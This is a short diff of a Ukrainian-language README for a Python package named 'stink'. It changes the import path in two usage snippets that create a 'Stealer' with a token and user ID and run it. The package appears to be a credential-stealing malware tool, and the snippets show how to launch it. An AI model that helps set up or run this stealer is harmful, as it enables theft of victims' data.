@@ -52,7 +52,7 @@
 ## Приклад використання
 ### Стандартний
 ```python
-from stink.multistealer import Stealer
+from stink import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
@@ -135,7 +135,7 @@ Python являється інтерпретованою мовою програ
 2. Розпаковуємо архів і переходимо в директорію stink-master.
 3. Створюємо test.py (або будь-яку іншу назву) файл в цій же директорії з наступним кодом:
 ```python
-from stink.multistealer import Stealer
+from stink import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
